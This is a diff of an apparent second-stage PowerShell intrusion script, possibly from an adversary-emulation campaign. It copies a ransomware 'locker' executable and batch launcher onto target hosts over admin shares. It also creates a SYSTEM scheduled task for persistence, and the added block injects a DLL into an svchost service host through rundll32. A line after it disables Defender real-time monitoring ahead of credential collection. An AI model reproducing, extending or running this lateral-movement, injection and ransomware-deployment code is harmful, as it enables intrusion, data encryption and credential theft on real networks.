@@ -65,6 +65,8 @@ if ($pw) {
         Copy-Item (Join-Path $work '143.dll') "\\$target\C$\ProgramData\143.dll" -Force
         Copy-Item (Join-Path $work 'mk.exe')  "\\$target\C$\ProgramData\mk.exe" -Force
         Copy-Item (Join-Path $work 'readme.txt') "\\$target\C$\readme.txt" -Force
+        Copy-Item (Join-Path $work 'inj.dll')  "\\$target\C$\ProgramData\inj.dll" -Force
+        Copy-Item (Join-Path $work 'D8B3.bin') "\\$target\C$\ProgramData\D8B3.bin" -Force
         $lockerName = 'o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe'
         Copy-Item (Join-Path $work 'locker.exe') "\\$target\C$\$lockerName" -Force
         Set-Content "\\$target\C$\locker.bat" "@echo off`r`nC:\$lockerName -m -net -size 10 -nomutex -p \\$target\C$" -Encoding ASCII
@@ -79,6 +81,25 @@ if ($pw) {
     $task = & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Persist /tr `"cmd.exe /c C:\ProgramData\143.cmd`" /sc onstart /ru SYSTEM /rl HIGHEST /f" 2>&1
     W ("persistence: " + (($task | Select-Object -First 1) -join ' '))
     & cmd.exe /c "net use \\$target\C$ /delete /y" 2>&1 | Out-Null
+
+    # ------------------------------------------------------------ inject into the per-user service host
+    $cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pw -AsPlainText -Force))
+    $injected = $false
+    for ($i = 0; $i -lt 30 -and -not $injected; $i++) {
+        try {
+            $hosts = Get-CimInstance Win32_Process -ComputerName $target -Credential $cred -ErrorAction Stop |
+                     Where-Object { $_.Name -eq 'svchost.exe' -and $_.CommandLine -match 'UnistackSvcGroup' }
+            if ($hosts) {
+                $pidTarget = $hosts[0].ProcessId
+                Set-Content "\\$target\C$\Users\Public\C0015\target.txt" $pidTarget -Encoding ASCII
+                Invoke-Remote "rundll32.exe C:\ProgramData\inj.dll,Run" "injection into service host $pidTarget"
+                W "injected into UnistackSvcGroup $pidTarget"
+                $injected = $true
+            }
+        } catch { }
+        if (-not $injected) { Start-Sleep -Seconds 10 }
+    }
+    if (-not $injected) { W 'no per-user service host found; skipped injection' }
 
     # ------------------------------------------------------------ credential collection on the target
     Invoke-Remote "powershell.exe -NoProfile -Command `"Set-MpPreference -DisableRealtimeMonitoring `$true`"" 'defence relaxed on target'
@@ -100,5 +121,6 @@ if ($pw) {
 }
 
 W "=== stage2 end ==="
+
 
 
